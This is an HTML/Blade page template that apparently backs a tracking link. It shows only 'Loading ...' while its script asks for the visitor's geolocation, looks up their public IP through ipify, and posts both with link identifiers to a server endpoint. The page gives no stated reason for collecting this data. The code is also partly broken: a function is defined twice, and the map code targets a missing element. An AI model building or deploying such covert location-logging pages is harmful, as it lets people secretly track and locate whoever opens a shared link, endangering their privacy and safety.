<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>IP and Location Details</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
</head>


<body onload="getLocation()">

    <style>
        /* Center the text horizontally and vertically */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        h1 {
            color: #4D5CC6; /* Apply the color */
        }
    </style>

    <h1 class="text-primary">Loading ...</h1>

    <script>
        const userLink = @json($userLink); // This line will embed the PHP variable into JS
        const LinkId = @json($LinkId); // This line will embed the PHP variable into JS

        let map, marker;

        function initMap() {
            const initialPosition = {
                lat: 0,
                lng: 0
            };

            map = new google.maps.Map(document.getElementById("map"), {
                zoom: 2,
                center: initialPosition,
                mapTypeId: 'roadmap',
            });

            marker = new google.maps.Marker({
                position: initialPosition,
                map: map,
                title: "Your Location",
            });
        }

        function updateMap(latitude, longitude) {
            const userPosition = {
                lat: latitude,
                lng: longitude
            };
            map.setCenter(userPosition);
            map.setZoom(15);
            marker.setPosition(userPosition);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const {
                        latitude,
                        longitude
                    } = position.coords;
                    updateMap(latitude, longitude);
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        // Function to get the location
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocationToServer);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendLocationToServer(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;


                    fetch('/store-user-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute(
                                    'content')
                            },
                            body: JSON.stringify({
                                latitude: latitude,
                                longitude: longitude,
                                ip: ipAddress,
                                userLink: userLink,
                                LinkId: LinkId
                            })
                        })
                        .then(response => {
                            if (!response.ok) {
                                return response.text().then(text => {
                                    throw new Error(text);
                                });
                            }
                            return response.json();
                        }).catch(error => {
                            document.body.innerHTML = `<p>Error: ${error.message}</p>`;
                        });
                });
        }
    </script>

</body>

</html>
